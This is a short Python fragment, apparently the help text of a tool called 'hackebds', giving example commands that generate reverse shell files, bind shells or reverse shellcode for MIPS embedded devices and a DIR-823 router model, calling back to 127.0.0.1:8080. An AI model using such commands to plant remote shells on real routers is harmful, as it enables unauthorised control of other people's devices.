...
def main():
	example = '''
example
	Generate  Specify  architecture:
	hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -arch mips -res reverse_shell_file(bind_shell/reverse_shellcode)
	Generate  Specify  model:
	Once:   hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -arch mips -model DIR-823 -res reverse_shell_file(bind_shell/reverse_shellcode)
    Second: hackebds -reverse_ip 127.0.0.1 -reverse_port 8080 -model DIR-823 -res reverse_shell_file(bind_shell/reverse_shellcode)
	'''
